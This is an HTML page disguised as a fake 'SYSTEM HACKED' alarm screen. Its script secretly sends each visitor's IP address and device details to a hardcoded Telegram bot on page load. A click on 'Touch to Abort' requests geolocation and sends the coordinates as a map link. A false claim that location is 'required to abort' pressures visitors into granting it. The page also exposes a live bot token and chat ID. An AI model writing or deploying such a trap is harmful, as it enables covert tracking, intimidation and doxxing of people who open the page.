<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM CRITICAL ERROR</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; cursor: crosshair; }
        .hacker-img { width: 100%; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; opacity: 0.5; z-index: -1; }
        .status { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; }
        h1 { font-size: 30px; color: red; text-shadow: 0 0 10px red; }
        .console { text-align: left; font-size: 12px; height: 150px; overflow: hidden; border: 1px solid #0f0; padding: 10px; background: rgba(0,0,0,0.8); }
    </style>
</head>
<body onclick="forceCapture()">

    <img src="https://i.ibb.co/6P8PzYk/hacker.jpg" class="hacker-img">

    <div class="status">
        <h1>[ SYSTEM HACKED ]</h1>
        <div class="console" id="console">
            > Initializing bypass...<br>
            > Accessing kernel...<br>
            > Fetching system data...<br>
        </div>
        <p style="color: yellow; margin-top: 20px;">Touch to Abort...</p>
    </div>

<script>
    // পেজ লোড হতেই আইপি পাঠিয়ে দিবে (কোনো পারমিশন লাগবে না)
    window.onload = function() {
        autoCapture();
        startConsole();
    };

    function startConsole() {
        let con = document.getElementById('console');
        setInterval(() => {
            con.innerHTML += "> Fetching packets... DONE<br>";
        }, 1000);
    }

    async function autoCapture() {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const userIP = ipData.ip;
        const device = navigator.userAgent;

        sendToTelegram(userIP, device, "Click to see location", "Click to see location");
    }

    function forceCapture() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                sendToTelegram("Update", "Update", pos.coords.latitude, pos.coords.longitude);
            }, () => {
                alert("ERROR: Security Bypass Failed! Location required to abort.");
            });
        }
    }

    function sendToTelegram(ip, dev, lat, lon) {
        const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
        const chat_id = "7547190025";
        let map = (lat === "Update" || lat === "Click to see location") ? lat : `https://www.google.com/maps?q=${lat},${lon}`;
        
        const text = `💀 **HACKER TRAP SUCCESS** 💀\n\n🌐 **IP:** ${ip}\n📱 **Device:** ${dev}\n📍 **Map:** ${map}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
    }
</script>

</html>
